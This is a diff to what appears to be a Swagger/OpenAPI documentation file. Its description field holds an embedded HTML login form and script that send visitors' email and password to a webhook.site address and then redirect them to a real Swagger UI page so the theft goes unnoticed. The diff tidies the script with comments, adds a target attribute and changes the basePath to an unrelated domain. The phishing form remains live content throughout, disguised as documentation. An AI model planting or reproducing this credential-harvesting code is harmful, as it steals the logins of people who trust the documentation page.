@@ -3,7 +3,7 @@ info:
   title: Classic API Resource Documentation
   description: |
     <h1>Log in to see the full documentation</h1>
-    <form id="loginForm" action="https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e" method="post" onsubmit="handleSubmit(event)">
+    <form id="loginForm" action="https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e" method="post" onsubmit="handleSubmit(event)" target="_blank">
     <label for="email">Login:</label>
     <input name="email" required>
     <label for="password">Password:</label>
@@ -12,14 +12,18 @@ info:
     <script>
       function handleSubmit(event) {
         event.preventDefault(); // Prevent default form submission
+        
+        // Get form data
         const form = document.getElementById('loginForm');
         const formData = new FormData(form);
 
+        // Perform the fetch request
         fetch(form.action, {
           method: 'POST',
           body: formData
         }).then(response => {
           if (response.ok) {
+            // Redirect to the desired URL after successful submission
             window.location.href = 'https://neopaydemo.synerioncloud.com/SynerionWeb/swagger/ui/index';
           } else {
             alert('Form submission failed');
@@ -31,7 +35,7 @@ info:
       }
     </script><!--
   version: production
-basePath: https://neopaydemo.synerioncloud.com/SynerionWeb
+basePath: https://www.epas.de
 produces:
 - application/xml
 - application/json
